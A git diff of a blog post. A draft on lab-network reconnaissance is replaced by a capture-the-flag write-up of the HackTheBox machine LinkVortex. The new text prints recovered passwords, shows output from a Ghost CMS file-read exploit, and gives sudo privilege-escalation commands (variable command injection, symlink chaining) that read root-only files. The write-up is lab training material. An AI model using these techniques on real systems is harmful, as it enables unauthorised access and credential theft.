@@ -1,445 +1,238 @@
 ---
-title: "Linkvortex write-up"
-description: "A quick reference guide to Verilog basics, including module declarations, signal assignments, operators, and common syntax patterns."
-date: "2024-08-06"
-lastUpdated: "2024-08-06"
+title: "Linkvortex write-up: My first pwned machine && an introduction to symlink chaining!"
+description: "A detailed walkthrough of compromising my first machine on HackTheBox, covering reconnaissance, git dumping, and privilege escalation through symlink exploitation."
+date: "2025-01-16"
+lastUpdated: "2025-01-16"
 author: "pindjouf"
 slug: "linkvortex"
-nextPost: "escape_two"
 prevPost: "mario-sees-nothing"
 tags:
-  - "verilog"
-  - "hardware"
-  - "hdl"
-  - "digital-design"
-  - "fpga"
-  - "tutorials"
-category: "Hardware Engineering"
-readingTime: 7
+  - "hackthebox"
+  - "pentesting"
+  - "ctf"
+  - "privilege-escalation"
+  - "symlinks"
+  - "ghost-cms"
+category: "Cybersecurity"
+readingTime: 15
 language: "en"
-published: false
+published: true
 tableOfContents: true
-series: "Hardware Description Languages"
+series: "HackTheBox Machines"
 seriesOrder: 1
 featured: true
 references:
-  - name: "Hackman's Verilog Article"
-    url: "https://lateblt.tripod.com/verilog.htm"
-  - name: "Learn X in Y Minutes"
-    url: "https://learnxinyminutes.com"
+  - name: "CVE-2023-40028"
+    url: "https://www.cve.org/CVERecord?id=CVE-2023-40028"
+  - name: "GitDump Tool"
+    url: "https://github.com/Ebryx/GitDump"
 ---
+
+My first machine on hack the box! I finally took the time to work on finding the flags of a machine, and with the help of a [Noir Chapeau](https://noirchapeau.com) member, I was able to compromise both the user and root account. Admittedly, this is a relatively easy box. But since I'd never successfully done one before, it was a relief to get some help and finally see how it works from beginning to end.
 
 ## Our base -- 10.10.11.47 (target machine)
 
-After connecting to the vpn I get this ip assigned to my virtual interface -> `10.10.14.55/23`
-And this is what my routing table became (including only relevant parts):
+So this is where we start from, a simple IP address. Now I won't bombard you with commands because that'd defeat the purpose of this article. I know a lot of write-ups typically include the commands they used, but I don't care about that (unless I'm struggling and desperately need a hint/answer). There's different ways to skin a cat, so I prefer focusing on the storyline of the attack rather than limiting myself to giving commands.
 
-```sh
-10.10.10.0/23 via 10.10.14.1 dev tun0 
-10.10.14.0/23 dev tun0 proto kernel scope link src 10.10.14.158 
-10.129.0.0/16 via 10.10.14.1 dev tun0 
+We have a single target, that already filters it quite a lot for us. We simply have to put all our attention on it and its services to figure out how to pwn it. With a simple service scan, we can see that both port `22` and `80` are open on this machine. Which makes things a lot simpler, I'd have struggled way more with too many services.
+
+## A first point of contact -- Recon
+
+We know that SSH is usually way more secure than HTTP, therefore I started with that. We also had no indications in terms of credentials so it'd be pointless to try anything there at that point. After sending a request to the target's IP, we'd get a permanent redirect. The usual course of action after seeing something like this I've learned is to add the domain you're getting redirected to in your `/etc/hosts` which effectively creates a pseudo-DNS record for it.
+
+I learned this by reading a blog post from [past3ll3](https://github.com/past3ll3) aka [shinyhat](https://purple.shinyhat.org/) where he mentioned encountering something similar, where web servers redirect you to unknown domain names. He then added them to his `/etc/hosts` to have local resolution and it worked! This may seem obvious to more experienced people, and I'm even surprised I didn't think of it myself because of how much sense it makes. Yet I don't think I would've thought of it had I not read that blog post. This works to bypass the redirection because instead of being forced to go to an unknown location we actually implement our own resolver which forces our requests to go to the actual IP instead of being redirected. Super simple, but you don't know what you don't know. Perhaps I could've figured this out, had I pondered on it for a little while. After that we could visit `linkvortex.htb` (the domain we were being redirected to) and have a real web page!
+
+<img src="/assets/linkvortex.png" alt="linkvortex.htb home page" style="width: 80%; display: block; margin-left: auto; margin-right: auto;">
+<div style="text-align: center;">
+    <i>Figure 1: linkvortex.htb home page</i>
+</div>
+
+I got the recommendation to always check for subdomains and directories when attacking websites as a bare minimum. So I did just that with [FFUF](https://github.com/ffuf/ffuf). There were quite a lot of directories, since it was a blog so I didn't pay any mind to most of them. But one of them had a name that wasn't featured in the list of articles, so it must've been something else. Upon visiting the `/ghost` page, I encountered a login form! Those are always sweet to see, but I didn't have any pointers for credentials yet. So we kept searching. Our fuzzing yielded only one result in the subdomain category, it was `dev.linkvortex.htb`. We added that to our `/etc/hosts` as well, and got met with this page:
+
+<img src="/assets/dev_linkvortex.png" alt="dev.linkvortex.htb launch page" style="width: 80%; display: block; margin-left: auto; margin-right: auto;">
+<div style="text-align: center;">
+    <i>Figure 2: dev.linkvortex.htb launch page</i>
+</div>
+
+As you might know, recon is cyclical. You look for new things on your main target, find some, and explore those further, find some more, and repeat. So now that we had a subdomain it was time to do some fuzzing on it as well. This is a point where we got *"stuck"*. I put that between quotes because I got informed that this part would be almost impossible to figure out without a little hint, so I got a little hint and found `/.git`.
+
+<img src="/assets/index_of_git.png" alt="Index of /.git" style="width: 80%; display: block; margin-left: auto; margin-right: auto;">
+<div style="text-align: center;">
+    <i>Figure 3: Index of /.git</i>
+</div>
+
+See, had I not received that help, I'd have kept on searching with lists that didn't contain the `.git` keyword. It's a lost battle from the start, that's why getting help is sometimes the only way to move forward. I had to include it in a list myself and sure enough there it was after a scan.
+
+## The search for credentials
+
+Now that we had gathered:
+
+- A *hidden* login page
+- A *hidden* subdomain
+- A `.git` directory
+
+It was time to start digging into those. Instead of flailing around on the login or launch soon page, we decided to go straight for the git directory since it potentially held critical information about the website. I got introduced to a tool called [git-dump.py](https://github.com/Ebryx/GitDump/tree/master?tab=readme-ov-file), it was supposedly able to retrieve the full content of the project, from the `.git` directory exclusively. I was quite sceptical of it at first but tried it anyways. I was pleasantly surprised to find out that after a quick `./git-dump.py http://dev.linkvortex.htb/.git` we found ourselves with the full project!
+
+<img src="/assets/linkvortex_project_directory.png" alt="Linkvortex project directory" style="width: 80%; display: block; margin-left: auto; margin-right: auto;">
+<div style="text-align: center;">
+    <i>Figure 4: Linkvortex project directory</i>
+</div>
+
+Most of the directories were empty, whether that's done on purpose by the people who made the machine, or a limitation of the tool we used, is above my pay grade to figure out. I had a full project to sift through and I was happy.
+
+I looked through it manually out of mental laziness but we could've simply using something like `❯ find . -name '*.js'` given that the HTTP headers contained an entry that clearly stated `X-Powered-By: Express` anyways, we found a very interesting file called `./core/test/regression/api/admin/authentication.test.js` and there were quite a lot of credentials in there with one of them being this:
+
+```js
+const email = 'test@example.com';
+const password = 'OctopiFociPilfer45';
 ```
 
-As we can see we're connected to 2 other networks than the one we're in, and all that through our default gateway `10.10.14.1`.
-And we know that our interface has routing to the 10.10.11.0/24 subnet because that's our target's subnet and we're able to ping them so why not other machines on that network? It must be routed through a machine on one of the networks we just discovered but that's out of our reach (for now)
+That didn't work, but the error message gave us a bit too much information since it openly stated that ***There is no user with that email address***. A mistake on their part, that would lead us in the right direction. I'd already tried to use `admin@linkvorted.htb` before and that was enough to confirm that the form did indeed reveal if an account existed or not. So we randomly tried the `admin@linkvorted.htb` combination with the password we found i.e. `OctopiFociPilfer45` and it went through successfully!
 
-## Information gathering -- recon phase
+<img src="/assets/ghost_admin_dashboard.png" alt="Ghost CMS admin dashboard" style="width: 80%; display: block; margin-left: auto; margin-right: auto;">
+<div style="text-align: center;">
+    <i>Figure 5: Ghost CMS admin dashboard</i>
+</div>
 
-Since we've discovered these new subnets let's see who we got around here! I did a few ping sweeps for network discovery (tried for 10.10.13.0/23 and 10.129.0.0/16 but they didn't yield any additional results)
+After looking through the app, we could find that the version it's running is outdated. The latest release was Ghost `5.82.3` but we were running was `5.58.0`, so we started looking for vulnerabilities, and stumbled upon [CVE-2023-40028](https://www.cve.org/CVERecord?id=CVE-2023-40028). Which would allow us to perform an arbitrary file read of any file on the host OS!
+
+## We're almost there
+
+With all of this new information, it was only a matter of time before we found the credentials. I'm officially not even at script kiddie level yet on hackthebox, so I didn't bother to study the vuln and make my own exploit for it. We found a nice little script that had just what we needed on [GitHub](https://github.com/0xyassine/CVE-2023-40028).
+
+As we'd found credentials already it was a breeze to use, we simply launched the script with them and were able to read any file on the machine that we wanted. Only issue is that we didn't know where to look, I mean we were *locked* in a shell so there's was no way to automate through enumeration and the common files where you'd expect to find information were either not found or wouldn't help us much. So we had to think of an alternative to guide us through this. Well we had the project's github repo, and there's one file we overlooked. It had a Dockerfile, those have all the instructions needed to build the project correctly, so if there was any interesting file to find, it'd be in here.
+
+I opened it and found this line: 
+```Dockerfile
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+```
+
+Let's give it a try (omitting irrelevant lines):
 
 ```bash
-nmap -v -sn 10.10.10.0/23 -oG ping-sweep.txt && clear && grep Up ping-sweep.txt | cut -d " " -f 2 > ips.txt
-nmap -v -sn 10.10.14.0/23 -oG ping-sweep.txt && clear && grep Up ping-sweep.txt | cut -d " " -f 2 >> ips.txt
+❮ ./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
+WELCOME TO THE CVE-2023-40028 SHELL
+Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
+File content:
+{
+  "mail": {
+     "transport": "SMTP",
+     "options": {
+      "service": "Google",
+      "host": "linkvortex.htb",
+      "port": 587,
+      "auth": {
+        "user": "bob@linkvortex.htb",
+        "pass": "fibber-talented-worth"
+        }
+      }
+    }
+}
 ```
 
-Here's all the IP addresses I was able to find.
+BINGO!!  
+A new account and service discovered. Since SMTP is running locally, bob must be a user of the machine right? We tried to ssh with his credentials and got to find our first flag!
 
-```sh
-10.10.10.2
-10.10.10.3
-10.10.10.245
-10.10.11.9
-10.10.11.10
-10.10.11.24
-10.10.11.26
-10.10.11.28
-10.10.11.30
-10.10.11.31
-10.10.11.32
-10.10.11.33
-10.10.11.34
-10.10.11.35
-10.10.11.36
-10.10.11.37
-10.10.11.38
-10.10.11.39
-10.10.11.40
-10.10.11.41
-10.10.11.42
-10.10.11.43
-10.10.11.44
-10.10.11.45
-10.10.11.46
-10.10.11.47
-10.10.11.48
-10.10.11.50
-10.10.11.221
-10.10.14.1
-10.10.14.55
+## Up the Down Escalator -- PrivEsc
+
+Now that we were finally inside the machine, it was time to tinker around with our privilege. I got advised to check what commands I could with elevated privileges that didn't require a password. And got this output:
+
+```yml
+Matching Defaults entries for bob on linkvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT
+
+User bob may run the following commands on linkvortex:
+    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
 ```
 
-I tried to visit our target IP in the browser just by curiosity but I was met with a redirection to `linkvortex.htb` a domain that obviously wouldn't resolve on my machine. I assumed that those records would perhaps be somewhere on a DNS in the network so I quickly scanned for port 53 with this.
+Here's the script's content:
 
-`for ip in $(cat ips.txt); do if nmap -sU -p 53 -n --open $ip | grep -q "53/udp open"; then echo $ip >> dns.txt; done`
+```bash
+#!/bin/bash
 
-And effectively reduced my sample size to the following IPs:
+QUAR_DIR="/var/quarantined"
 
-```sh
-10.10.10.2
-10.10.10.3
-10.10.11.24
-10.10.11.26
-10.10.11.31
-10.10.11.35
-10.10.11.39
-10.10.11.41
-10.10.11.42
-10.10.11.45
-10.10.14.1
+if [ -z $CHECK_CONTENT ];then
+  CHECK_CONTENT=false
+fi
+
+LINK=$1
+
+if ! [[ "$LINK" =~ \.png$ ]]; then
+  /usr/bin/echo "! First argument must be a png file !"
+  exit 2
+fi
+
+if /usr/bin/sudo /usr/bin/test -L $LINK;then
+  LINK_NAME=$(/usr/bin/basename $LINK)
+  LINK_TARGET=$(/usr/bin/readlink $LINK)
+  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
+    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
+    /usr/bin/unlink $LINK
+  else
+    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
+    /usr/bin/mv $LINK $QUAR_DIR/
+    if $CHECK_CONTENT;then
+      /usr/bin/echo "Content:"
+      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
+    fi
+  fi
+fi
 ```
 
-Before querying these servers for the `linkvortex.htb` domain name, I decided to go look for some more because I saw that most of these servers had an Active Directory LDAP running on them (thanks to [my nmap visualizer](https://idy.pindjouf.xyz) and an aggressive `nmap` scan of all the hosts) so I was quickly able to find the hostnames associated to those machines. I now had around 6 hostnames, but I wanted more. Since the target's IP redirected us to a domain name, why wouldn't the others do the same? So I ran a for loop to send requests to all the IPs I had, like this: `for ip in $(cat ips.txt); do echo "Sending request to: $ip" && timeout 1s curl --head "$ip":80; done`
+And how we got the flag:
 
-I could now see which IP I was sending a request to, and I'd look through them to see if there was any redirection happening (no clever tricks or command line magic here).
-
-After all of this I was left with a few more domain names which I added to the list. Here's what we've got so far:
-
-```txt
-magicgardens.htb
-monitorsthree.htb
-sightless.htb
-caption.htb
-trickster.htb
-yummy.htb
-instant.htb
-university.htb
-alert.htb
-heal.htb
-linkvortex.htb
-2million.htb
-vintage.htb
-administrator.htb
-certified.htb
-cicada.htb
-ghost.htb
-sightless.htb
+```bash
+CHECK_CONTENT='/bin/cat /root/root.txt'
+touch a.png
+ln -s a.png b.png
+sudo /usr/bin/bash /opt/ghost/clean_symlink.sh b.png
 ```
 
-To be honest, I didn't know what to do at this point.
-Luckily enough, I decided to read a blog post from [past3ll3](https://github.com/past3ll3) aka [shinyhat](https://purple.shinyhat.org/) where he mentioned encountering something similar, where web servers redirect you to unknown domain names. He then added them to his `/etc/hosts` to have local resolution and it worked! This may seem obvious to more experienced people, and I'm even surprised I didn't think of it myself because of how much sense it makes. Yet I don't think I would've thought of it had I not read that blog post. This works to bypass the redirection because instead of being forced to go to an unknown location we actually implement our own resolver which forces our requests to go to the actual IP instead of being redirected. Super simple, but you don't know what you don't know. Perhaps I could've figured this out, had I pondered on it for a little while.
+So there it is, a full write-up on linkvortex! I hope you learned a bit, and enjoyed the reading.
 
-I now had access to all the websites that had *records* in our `/etc/hosts`!
+## End notes
 
-One last thing I wanted to check was the DNS servers, I still hadn't made great use of them so I decided to loop through them all, and query for each domain name that I had on my list. This is what it looked like: `for dns in $(cat dns.txt); do for host in $(cat hosts.txt); do dig +tries=1 +time=2 any "$host" @"$dns"; done; done`
+I'd like to get into **why** our solution worked and explore an alternative way to find the root flag.
 
-Here's what I got from it (I cleaned up to just have the answer, additional and server sections):
+### Symlinks fundamentals
 
-```ruby
-;; ANSWER SECTION:
-infiltrator.htb.	600	IN	A	10.10.11.31
-infiltrator.htb.	3600	IN	NS	dc01.infiltrator.htb.
-infiltrator.htb.	3600	IN	SOA	dc01.infiltrator.htb. hostmaster.infiltrator.htb. 419 900 600 86400 3600
+First we have to understand the basics of symlinks. They're simply a file that point to another file. It doesn't have to get any more complex than this for the purposes of our exploration.
 
-;; ADDITIONAL SECTION:
-dc01.infiltrator.htb.	3600	IN	A	10.10.11.31
+### Exploring the script
 
-;; SERVER: 10.10.11.31#53(10.10.11.31) (TCP)
+So what is it actually doing? Let's go through it line by line.
 
-;; ANSWER SECTION:
-university.htb.		600	IN	A	192.168.99.1
-university.htb.		600	IN	A	10.10.11.39
-university.htb.		3600	IN	NS	dc.university.htb.
-university.htb.		3600	IN	SOA	dc.university.htb. hostmaster.university.htb. 541 900 600 86400 3600
+Basics:
+- declare a variable with the path to a *quarantined* directory
+- check for a string's content, returns true if it's empty, and so in our case toggle it to false
+- declare LINK as the first argument passed to the script i.e `b.png`
+- if the first argument doesn't have the `.png` extension we throw an error
+- it checks if the first argument (file) we passed exists, and if it's a symbolic link
+- stores the filename in a variable by getting rid of it's leading directory path i.e. `b.png`
+- stores the value of our symlink in a var i.e. the filename of what our symlink is pointing to i.e. `a.png`
+- it then checks if that value contains either `etc` or `root` in it
+- nukes your symlink if that's the case and calls it a day
+- if the aformentioned condition isn't true we now move that value to the quarantined directory i.e. `/var/quarantined/a.png`
 
-;; ADDITIONAL SECTION:
-dc.university.htb.	3600	IN	A	192.168.99.1
-dc.university.htb.	3600	IN	A	10.10.11.39
+Where things get interesting:
+Our next condition is the crucial part of this exploit, see when we use a variable in an `if` statement like this, bash takes its value i.e. `/bin/cat /root/root.txt` executes it as a command, and uses the exit code of that command as the condition!!
 
-;; SERVER: 10.10.11.39#53(10.10.11.39) (TCP)
+Since it executes the command as part of the check, we get to see the content of the /root/root.txt file since the script is owned by root!!
+It's a clever trick to execute a command that was previously unavailable to us! See here the most interesting part was that `CHECK_CONTENT` variable, and the last conditional statement. It's what allowed us to execute commands as root. So really all these symlinks shenanigans were not part of the thing at all, we simply used them because they were prerequisites to run the script effectively.
 
-;; ANSWER SECTION:
-vintage.htb.		600	IN	A	10.10.11.45
+Although there IS a way to do this properly, which is called symlink chaining. The premise of it is that we ultimately get access to a file through indirect means. Here's a practical example:
 
-;; SERVER: 10.10.11.45#53(10.10.11.45) (UDP)
-
-;; ANSWER SECTION:
-administrator.htb.	600	IN	A	10.10.11.42
-
-;; SERVER: 10.10.11.42#53(10.10.11.42) (UDP)
-
-;; ANSWER SECTION:
-certified.htb.		600	IN	A	10.10.11.41
-
-;; SERVER: 10.10.11.41#53(10.10.11.41) (UDP)
-
-;; ANSWER SECTION:
-cicada.htb.		600	IN	A	10.10.11.35
-
-;; SERVER: 10.10.11.35#53(10.10.11.35) (UDP)
-
-;; ANSWER SECTION:
-ghost.htb.		600	IN	A	10.0.0.254
-ghost.htb.		600	IN	A	127.0.0.1
-ghost.htb.		600	IN	A	10.10.11.24
-
-;; SERVER: 10.10.11.24#53(10.10.11.24) (UDP)
+```bash
+touch a.png
+ln -s /home/bob/a.png /home/bob/b.png
+ln -sf /root/root.txt /home/bob/a.png
+export CHECK_CONTENT=true
+sudo /usr/bin/bash /opt/ghost/clean_symlink.sh b.png
 ```
 
-We've got quite a few interesting things here now! We can identify two domain controllers (`dc.university.htb` and `dc01.infiltrator.htb`), ans consequently two email addresses `hostmaster@university.htb` and `hostmaster@infiltrator.htb` a brand new IP/subnet `192.168.99.1` and some records we couldn't have found from our http redirection scan! (some of the domain names seen in the previous list were found here btw)
+As you can see here we're creating a file, making a symlink to it, and then transforming that file into a symlink itself to our root flag.
+This bypasses all of the checks in the script that are supposed to block us in very clever ways! For instance, when they try to check if our `b.png` has `etc` or `root` in it, they can't get us! Because `b.png` simply points to `a.png` which is a symlink itsef, sure but `realink` simply gets the filename so we're chill. Since we passed that check we also had to turn `CHECK_CONTENT` to true so that we're able to cat the content of `a.png`, which is the content of `/root/root.txt`!!!! Whereas `readlink` simply looked for a filename on the other end of the link, cat actually follows the chain to its final value. And so we get the content of `/root/root.txt`
 
-I also did a reverse lookup by adding the `-x` flag to the `dig` command and querying for the ips instead of the hostnames (obviously), but that didn't yield any results.
-
-Since we discovered new records I decided to add those to my `/etc/hosts`, but when I tried to access their web page I'd either get a 404 or there wouldn't be any web server at all. So I decided to investigate further by querying the respective DNS servers for their own hostnames.
-
-I put the hostnames I got from these new records and the DNS IPs in two separate files in the same order. And ran this on them:
-
-```sh
-paste dns_ip_tmp.txt dns_hostnames_tmp.txt | while IFS=$'\t' read -r ip hostname; do
-    echo "Querying $hostname at $ip"
-    dig any "$hostname" @"$ip"
-done
-```
-
-I combine the two files' content line by line separated by tabs in a buffer, with the `paste` command. I then pipe that to a while loop that assigns each column's content to the respective variable with `read`. We then use those to send out queries.
-
-This shows us that they're all in fact domain controllers!
-
-```ruby
-;; ANSWER SECTION:
-infiltrator.htb.	600	IN	A	10.10.11.31
-infiltrator.htb.	3600	IN	NS	dc01.infiltrator.htb.
-infiltrator.htb.	3600	IN	SOA	dc01.infiltrator.htb. hostmaster.infiltrator.htb. 419 900 600 86400 3600
-
-;; ADDITIONAL SECTION:
-dc01.infiltrator.htb.	3600	IN	A	10.10.11.31
-
-;; SERVER: 10.10.11.31#53(10.10.11.31) (TCP)
-
-;; ANSWER SECTION:
-university.htb.		600	IN	A	192.168.99.1
-university.htb.		600	IN	A	10.10.11.39
-university.htb.		3600	IN	NS	dc.university.htb.
-university.htb.		3600	IN	SOA	dc.university.htb. hostmaster.university.htb. 541 900 600 86400 3600
-
-;; ADDITIONAL SECTION:
-dc.university.htb.	3600	IN	A	192.168.99.1
-dc.university.htb.	3600	IN	A	10.10.11.39
-
-;; SERVER: 10.10.11.39#53(10.10.11.39) (TCP)
-
-;; ANSWER SECTION:
-vintage.htb.		600	IN	A	10.10.11.45
-vintage.htb.		3600	IN	NS	dc01.vintage.htb.
-vintage.htb.		3600	IN	SOA	dc01.vintage.htb. hostmaster.vintage.htb. 222 900 600 86400 3600
-
-;; ADDITIONAL SECTION:
-dc01.vintage.htb.	3600	IN	A	10.10.11.45
-
-;; SERVER: 10.10.11.45#53(10.10.11.45) (TCP)
-
-;; ANSWER SECTION:
-administrator.htb.	600	IN	A	10.10.11.42
-administrator.htb.	3600	IN	NS	dc.administrator.htb.
-administrator.htb.	3600	IN	SOA	dc.administrator.htb. hostmaster.administrator.htb. 122 900 600 86400 3600
-
-;; ADDITIONAL SECTION:
-dc.administrator.htb.	3600	IN	A	10.10.11.42
-
-;; SERVER: 10.10.11.42#53(10.10.11.42) (TCP)
-
-;; ANSWER SECTION:
-certified.htb.		600	IN	A	10.10.11.41
-certified.htb.		3600	IN	NS	dc01.certified.htb.
-certified.htb.		3600	IN	SOA	dc01.certified.htb. hostmaster.certified.htb. 165 900 600 86400 3600
-
-;; ADDITIONAL SECTION:
-dc01.certified.htb.	3600	IN	A	10.10.11.41
-
-;; SERVER: 10.10.11.41#53(10.10.11.41) (TCP)
-
-;; ANSWER SECTION:
-cicada.htb.		600	IN	A	10.10.11.35
-cicada.htb.		3600	IN	NS	cicada-dc.cicada.htb.
-cicada.htb.		3600	IN	SOA	cicada-dc.cicada.htb. hostmaster.cicada.htb. 154 900 600 86400 3600
-
-;; ADDITIONAL SECTION:
-cicada-dc.cicada.htb.	3600	IN	A	10.10.11.35
-
-;; SERVER: 10.10.11.35#53(10.10.11.35) (TCP)
-
-;; ANSWER SECTION:
-ghost.htb.		600	IN	A	10.0.0.254
-ghost.htb.		3600	IN	A	127.0.0.1
-ghost.htb.		600	IN	A	10.10.11.24
-ghost.htb.		3600	IN	NS	dc01.ghost.htb.
-ghost.htb.		3600	IN	SOA	dc01.ghost.htb. hostmaster.ghost.htb. 244 900 600 86400 3600
-
-;; ADDITIONAL SECTION:
-dc01.ghost.htb.		3600	IN	A	10.10.11.24
-dc01.ghost.htb.		3600	IN	A	10.0.0.254
-
-;; SERVER: 10.10.11.24#53(10.10.11.24) (TCP)
-```
-
-Now that I had all this information I wanted to check for common vulnerable ports like SMB for instance which I scanned with this `for ip in $(cat recon/ips.txt); do nmap -v -p 139,445 --script smb-os-discovery "$ip"; done` this got me a bit more data on one host! A brand new domain name and subdomain and a computer name. So let's add those to the list and keep going.
-
-```js
-Nmap scan report for 10.10.10.3
-
-PORT    STATE SERVICE
-139/tcp open  netbios-ssn
-445/tcp open  microsoft-ds
-
-Host script results:
-| smb-os-discovery:
-|   OS: Unix (Samba 3.0.20-Debian)
-|   Computer name: lame
-|   NetBIOS computer name:
-|   Domain name: hackthebox.gr
-|   FQDN: lame.hackthebox.gr
-|_  System time: 2025-01-08T20:46:57-05:00
-
-Read data files from: /usr/bin/../share/nmap
-```
-I quickly tried to ask the DNS servers if they had any information about these new domain names but alas they had nothing.
-However I was able to find quite a lot of information about this machines by using `enum4linux-ng -u '' 10.10.10.3` and `smbmap -u -H 10.10.10.3` I did this on all the machines, but the most notable ones are `10.10.10.3` & `10.10.11.35`
-
-Like a list of users (for `10.10.10.3`):
-
-```txt
-root
-daemon
-bin
-sys
-sync
-games
-man
-lp
-mail
-news
-uucp
-proxy
-www-data
-backup
-list
-irc
-gnats
-libuuid
-dhcp
-syslog
-klog
-sshd
-bind
-postfix
-ftp
-postgres
-mysql
-tomcat55
-distccd
-telnetd
-proftpd
-msfadmin
-user
-service
-nobody
-```
-
-And shares:
-
-```js
-[*] Detected 1 hosts serving SMB
-[*] Established 1 SMB connections(s) and 1 authenticated session(s)
-
-[+] IP: 10.10.10.3:445	Name: hackthebox.gr       	Status: Authenticated
-	Disk                                                  	Permissions	Comment
-	----                                                  	-----------	-------
-	print$                                            	NO ACCESS	Printer Drivers
-	tmp                                               	READ, WRITE	oh noes!
-	opt                                               	NO ACCESS
-	IPC$                                              	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
-	ADMIN$                                            	NO ACCESS	IPC Service (lame server (Samba 3.0.20-Debian))
-```
-
-```js
-[*] Detected 1 hosts serving SMB
-[*] Established 1 SMB connections(s) and 0 authenticated session(s)
-
-[+] IP: 10.10.11.35:445    Name: CICADA-DC            Status: Unauthenticated
-        Disk                                                  	Permissions	Comment
-        ----                                                  	-----------	-------
-        ADMIN$                                            	NO ACCESS	Remote Admin
-        C$                                               	NO ACCESS	Default share
-        DEV                                              	READ ONLY	
-        HR                                               	READ ONLY	
-        IPC$                                             	READ ONLY	Remote IPC
-        NETLOGON                                         	READ ONLY	Logon server share
-        SYSVOL                                           	READ ONLY	Logon server share
-```
-
-I couldn't get much from SMTP so I went straight to SNMP enumeration with `snmpwalk -c public -v2c -Oa 10.10.11.48` and found this on our target's neighbor machine!
-
-```ruby
-Scanning: 10.10.11.48
-iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
-iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
-iso.3.6.1.2.1.1.3.0 = Timeticks: (935969) 2:35:59.69
-iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
-iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
-iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
-iso.3.6.1.2.1.1.7.0 = INTEGER: 72
-iso.3.6.1.2.1.1.8.0 = Timeticks: (5) 0:00:00.05
-iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
-iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
-iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
-iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
-iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
-iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
-iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
-iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
-iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
-iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
-iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
-iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
-iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
-iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
-iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
-iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
-iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
-iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
-iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
-iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
-iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (3) 0:00:00.03
-iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (3) 0:00:00.03
-iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (3) 0:00:00.03
-iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (3) 0:00:00.03
-iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (3) 0:00:00.03
-iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (4) 0:00:00.04
-iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (4) 0:00:00.04
-iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (5) 0:00:00.05
-iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (5) 0:00:00.05
-iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (5) 0:00:00.05
-iso.3.6.1.2.1.25.1.1.0 = Timeticks: (937724) 2:36:17.24
-iso.3.6.1.2.1.25.1.2.0 = STRING: "....&2.+.."
-iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
-iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0"
-iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
-iso.3.6.1.2.1.25.1.6.0 = Gauge32: 310
-iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
-iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
-```
-
-This `iso.3.6.1.2.1.25.1.2.0 = STRING: "....&2.+.."` particular line intrigues me quite a bit, it seems to be encrypted. Mind you I only used the `-Oa` flag, because it was originally a hex string. I thought let's try version 1 since there was no encryption then and it changed to this: `iso.3.6.1.2.1.25.1.2.0 = STRING: "....(%.+.."`. Nothing crazy here, but I'll still take a mental note of it.
-
-## Vulnerability assessment
-
-
